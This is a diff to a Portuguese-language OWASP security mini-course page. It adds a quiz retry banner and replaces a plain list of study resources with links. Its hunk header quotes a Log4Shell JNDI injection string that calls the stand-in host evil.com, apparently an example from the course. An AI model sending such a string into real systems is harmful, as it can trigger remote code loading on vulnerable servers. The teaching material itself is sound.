@@ -479,16 +479,23 @@ LOG.info("${jndi:ldap://evil.com/a}")
 <div class="quiz-feedback nok">Não foi dessa vez. Releia o conteúdo e tente novamente!</div>
 </div>
 </div>
+
+<div class="quiz-retry-banner" id="quiz-banner">
+  <div class="score" id="quiz-score-display"></div>
+  <div class="msg" id="quiz-msg"></div>
+  <button onclick="retryQuiz()">🔄 Tentar novamente</button>
+</div>
+
 <!-- Aprofundamento -->
 <div class="section">
 <div class="card">
 <h2>🎓 Aprofundamento</h2>
-<p class="muted">Este é um <strong>mini-curso/resumo</strong>. Para explorar a fundo:</p>
+<p class="muted">Para explorar a fundo cada tema:</p>
 <ul>
 <li><strong>Udemy:</strong> "The Complete Ethical Hacking Course" / "OWASP Top 10 Security Vulnerabilities"</li>
-<li><strong>Alura:</strong> "Segurança em APIs" / "Web Security: aprenda a se defender de OWASP Top 10"</li>
-<li><strong>YouTube:</strong> "OWASP Top 10" (YouTube OWASP Foundation) / "Ethical Hacking" (Computerphile)</li>
-<li><strong>Docs oficiais:</strong> <code class="inline">owasp.org</code>, <code class="inline">cwe.mitre.org</code>, <code class="inline">nvd.nist.gov</code> (CVE database)</li>
+<li><strong>Alura:</strong> <a href="https://www.alura.com.br/curso-online-seguranca-apis-rest" target="_blank">Segurança em APIs</a> | <a href="https://www.alura.com.br/curso-online-seguranca-web-owasp" target="_blank">Web Security: OWASP Top 10</a></li>
+<li><strong>YouTube:</strong> <a href="https://www.youtube.com/@OWASP" target="_blank">OWASP Foundation</a> | <a href="https://www.youtube.com/@Computerphile" target="_blank">Computerphile (Ethical Hacking)</a></li>
+<li><strong>Docs:</strong> <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a> | <a href="https://cwe.mitre.org/" target="_blank">CWE Mitre</a> | <a href="https://nvd.nist.gov/" target="_blank">NVD CVE Database</a></li>
 </ul>
 </div>
 </div>
